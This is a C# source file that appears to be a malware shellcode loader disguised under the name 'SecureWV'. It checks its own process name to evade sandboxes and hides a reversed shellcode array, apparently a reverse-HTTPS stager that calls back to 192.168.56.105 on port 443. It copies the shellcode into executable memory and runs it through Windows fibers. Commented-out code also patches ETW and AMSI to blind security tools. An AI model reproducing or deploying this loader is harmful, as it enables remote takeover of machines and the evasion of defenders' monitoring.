using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Linq;

namespace SecureWV
{

	class Program
	{

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		[DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
		static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

		[DllImport("kernel32.dll", EntryPoint = "FreeLibrary")]
		static extern bool FreeLibrary(int hModule);
/*
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate IntPtr VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
		UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

*/
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate IntPtr VirtualAlloc(IntPtr lpAddress,
uint dwSize, uint flAllocationType, uint flProtect);



		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate IntPtr ConvertThreadToFiber(IntPtr lpParameter);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate IntPtr CreateFiber(uint dwStackSize,
   IntPtr lpStartAddress, IntPtr lpParameter);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate IntPtr SwitchToFiber(IntPtr lpFiber);
		static void Main()
		{
			
			var name = Process.GetCurrentProcess().ProcessName;
			if( name != "SecureWV.exe"){
				Environment.Exit(0);
			}
			
			var library = LoadLibrary("kernel32.dll");
			//var logger = LoadLibrary("ntdll.dll");
			//var lib = GetProcAddress(logger, "EtwEventWrite");
			//var seclib = LoadLibrary("amsi.dll");


		//	IntPtr protection = GetProcAddress(library, "VirtualProtectEx");
			IntPtr memlocation = GetProcAddress(library, "VirtualAlloc");
			IntPtr Converter = GetProcAddress(library, "ConvertThreadToFiber");
			IntPtr Creater = GetProcAddress(library, "CreateFiber");
			IntPtr Switcher = GetProcAddress(library, "SwitchToFiber");

		//	VirtualProtectEx Protect = (VirtualProtectEx)Marshal.GetDelegateForFunctionPointer(protection, typeof(VirtualProtectEx));
			VirtualAlloc myMem = (VirtualAlloc)Marshal.GetDelegateForFunctionPointer(memlocation, typeof(VirtualAlloc));
			ConvertThreadToFiber master = (ConvertThreadToFiber)Marshal.GetDelegateForFunctionPointer(Converter, typeof(ConvertThreadToFiber));
			CreateFiber Creation = (CreateFiber)Marshal.GetDelegateForFunctionPointer(Creater, typeof(CreateFiber));
			SwitchToFiber mySwitch = (SwitchToFiber)Marshal.GetDelegateForFunctionPointer(Switcher, typeof(SwitchToFiber));
			/*
			byte[] patch;
			if (System.Environment.Is64BitProcess == true)
			{
				patch = new byte[2];
				patch[0] = 0xc3;
				patch[1] = 0x00;
			}
			else
			{
				patch = new byte[3];
				patch[0] = 0xc2;
				patch[1] = 0x14;
				patch[2] = 0x00;
			}


			byte[] patch2;
			if (System.Environment.Is64BitProcess == true)
			{
				patch2 = new byte[6];
				patch2[0] = 0xB8;
				patch2[1] = 0x57;
				patch2[2] = 0x00;
				patch2[3] = 0x07;
				patch2[4] = 0x80;
				patch2[5] = 0xc3;
			}
			else
			{
				patch2 = new byte[8];
				patch2[0] = 0xB8;
				patch2[1] = 0x57;
				patch2[2] = 0x00;
				patch2[3] = 0x07;
				patch2[4] = 0x80;
				patch2[5] = 0xc2;
				patch2[6] = 0x18;
				patch2[7] = 0x00;
			}
			*/
			/*
			IntPtr MasterFiber = master(IntPtr.Zero);
			//ETW Patch start
			Protect(IntPtr.Zero, lib, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
			Marshal.Copy(patch, 0, lib, patch.Length);
			Protect(IntPtr.Zero, lib, (UIntPtr)patch.Length, oldProtect, out oldProtect);

			//ETW is patched

			//Patch AMSI
			var defLib = GetProcAddress(seclib, "AmsiScanBuffer");
			Protect(IntPtr.Zero, defLib, (UIntPtr)patch2.Length, 0x40, out oldProtect);
			Marshal.Copy(patch2, 0, defLib, patch2.Length);
			Protect(IntPtr.Zero, defLib, (UIntPtr)patch2.Length, oldProtect, out oldProtect);

			//End AMSI
			*/
			//Execute Shellcode
			byte[] buf = new byte[589] { 0xd5, 0xff, 0x56, 0xa2, 0xb5, 0xf0, 0xc2, 0xc7, 0x49, 0x59, 0x00, 0x6a, 0x58, 0xc3, 0x58, 0xd2, 0x75, 0xc0, 0x85, 0xc3, 0x01, 0x48, 0x07, 0x8b, 0x66, 0xb2, 0x74, 0xc0, 0x85, 0x20, 0xc4, 0x83, 0x48, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0xe2, 0x89, 0x96, 0x12, 0xba, 0x49, 0xf9, 0x89, 0x49, 0x00, 0x00, 0x20, 0x00, 0xc0, 0xc7, 0x49, 0xda, 0x89, 0x48, 0xf1, 0x89, 0x48, 0xe7, 0x89, 0x48, 0x53, 0x53, 0x93, 0x48, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0xe5, 0x53, 0xa4, 0x58, 0xba, 0x49, 0x00, 0x00, 0x10, 0x00, 0xc0, 0xc7, 0x49, 0x10, 0xe2, 0xc1, 0xd1, 0x89, 0x49, 0x5a, 0x40, 0x6a, 0x59, 0x53, 0x00, 0x00, 0x00, 0x55, 0xe8, 0xaa, 0xeb, 0x02, 0x74, 0xcf, 0xff, 0x48, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x35, 0xf0, 0x44, 0xba, 0x49, 0x00, 0x00, 0x13, 0x88, 0xc1, 0xc7, 0x48, 0x1f, 0x75, 0xc0, 0x85, 0xd5, 0xff, 0x7b, 0x18, 0x06, 0x2d, 0xc2, 0xc7, 0x49, 0x53, 0x53, 0xc9, 0x31, 0x4d, 0xc9, 0x31, 0x4d, 0xf1, 0x89, 0x48, 0x5a, 0x53, 0xc0, 0x31, 0x4d, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0x86, 0x9e, 0x46, 0x75, 0xba, 0x49, 0x59, 0x41, 0x04, 0x6a, 0xe0, 0x89, 0x49, 0x00, 0x00, 0x33, 0x80, 0x68, 0x52, 0x5a, 0x1f, 0x6a, 0xf1, 0x89, 0x48, 0x5f, 0x0a, 0x6a, 0xc6, 0x89, 0x48, 0xd5, 0xff, 0x3b, 0x2e, 0x55, 0xeb, 0xc2, 0xc7, 0x49, 0x53, 0x53, 0x50, 0x00, 0x00, 0x00, 0x00, 0x84, 0xa8, 0x32, 0x00, 0xb8, 0x48, 0x53, 0xc9, 0x31, 0x4d, 0x58, 0x41, 0x5a, 0x53, 0xc1, 0x89, 0x48, 0x00, 0x6e, 0x64, 0x69, 0x66, 0x64, 0x67, 0x58, 0x53, 0x4c, 0x33, 0x62, 0x77, 0x62, 0x48, 0x41, 0x7a, 0x66, 0x54, 0x30, 0x52, 0x45, 0x63, 0x59, 0x39, 0x38, 0x39, 0x63, 0x78, 0x64, 0x58, 0x78, 0x50, 0x42, 0x2f, 0x00, 0x00, 0x00, 0x23, 0xe8, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0xc6, 0x9f, 0x89, 0x57, 0xba, 0x49, 0x53, 0x03, 0x6a, 0x53, 0x53, 0xc9, 0x31, 0x4d, 0x00, 0x00, 0x01, 0xbb, 0xc0, 0xc7, 0x49, 0xc1, 0x89, 0x48, 0x5a, 0x00, 0x35, 0x30, 0x31, 0x2e, 0x36, 0x35, 0x2e, 0x38, 0x36, 0x31, 0x2e, 0x32, 0x39, 0x31, 0x00, 0x00, 0x00, 0x0f, 0xe8, 0xd5, 0xff, 0x00, 0x00, 0x00, 0x00, 0xa7, 0x79, 0x56, 0x3a, 0xba, 0x49, 0x53, 0x53, 0xc9, 0x31, 0x4d, 0xc0, 0x31, 0x4d, 0x5a, 0x53, 0xe1, 0x89, 0x48, 0x53, 0x53, 0xd5, 0xff, 0x07, 0x26, 0x77, 0x4c, 0xc2, 0xc7, 0x49, 0xe1, 0x89, 0x48, 0x56, 0x41, 0x00, 0x74, 0x65, 0x6e, 0x69, 0x6e, 0x69, 0x77, 0xbe, 0x49, 0x53, 0xdb, 0x31, 0x48, 0x5d, 0xff, 0xff, 0xff, 0x4b, 0xe9, 0x12, 0x8b, 0x48, 0x5a, 0x59, 0x41, 0x58, 0xe0, 0xff, 0x52, 0x41, 0x20, 0xec, 0x83, 0x48, 0x5a, 0x41, 0x59, 0x41, 0x58, 0x41, 0x5a, 0x59, 0x5e, 0x58, 0x41, 0xd0, 0x01, 0x48, 0x58, 0x41, 0x88, 0x04, 0x8b, 0x41, 0xd0, 0x01, 0x49, 0x1c, 0x40, 0x8b, 0x44, 0x48, 0x0c, 0x8b, 0x41, 0x66, 0xd0, 0x01, 0x49, 0x24, 0x40, 0x8b, 0x44, 0x58, 0xd8, 0x75, 0xd1, 0x39, 0x45, 0x08, 0x24, 0x4c, 0x03, 0x4c, 0xf1, 0x75, 0xe0, 0x38, 0xc1, 0x01, 0x41, 0xac, 0x0d, 0xc9, 0xc1, 0x41, 0xc0, 0x31, 0x48, 0xd6, 0x01, 0x48, 0xc9, 0x31, 0x4d, 0x88, 0x34, 0x8b, 0x41, 0xc9, 0xff, 0x48, 0x56, 0xe3, 0xd0, 0x01, 0x49, 0x50, 0x20, 0x40, 0x8b, 0x44, 0x18, 0x48, 0x8b, 0xd0, 0x01, 0x48, 0x67, 0x74, 0xc0, 0x85, 0x48, 0x00, 0x00, 0x00, 0x88, 0x80, 0x8b, 0x00, 0x00, 0x00, 0x72, 0x85, 0x0f, 0x02, 0x0b, 0x18, 0x78, 0x81, 0x66, 0xd0, 0x01, 0x48, 0x3c, 0x42, 0x8b, 0x20, 0x52, 0x8b, 0x48, 0x51, 0x41, 0x52, 0xed, 0xe2, 0xc1, 0x01, 0x41, 0x0d, 0xc9, 0xc1, 0x41, 0x20, 0x2c, 0x02, 0x7c, 0x61, 0x3c, 0xac, 0xc0, 0x31, 0x48, 0x4a, 0x4a, 0xb7, 0x0f, 0x48, 0xc9, 0x31, 0x4d, 0x50, 0x72, 0x8b, 0x48, 0x56, 0x20, 0x52, 0x8b, 0x48, 0x18, 0x52, 0x8b, 0x48, 0x60, 0x52, 0x8b, 0x48, 0x65, 0xd2, 0x31, 0x48, 0x51, 0x52, 0x50, 0x41, 0x51, 0x41, 0x00, 0x00, 0x00, 0xcc, 0xe8, 0xf0, 0xe4, 0x83, 0x48, 0xfc };
			Array.Reverse(buf);
			IntPtr hMem = myMem(IntPtr.Zero, 0x1000, 0x3000, 0x40);
			Marshal.Copy(buf, 0, hMem, buf.Length);
			IntPtr hFiber = Creation(0, hMem, IntPtr.Zero);
			mySwitch(hFiber);
			;
		}
	}
}
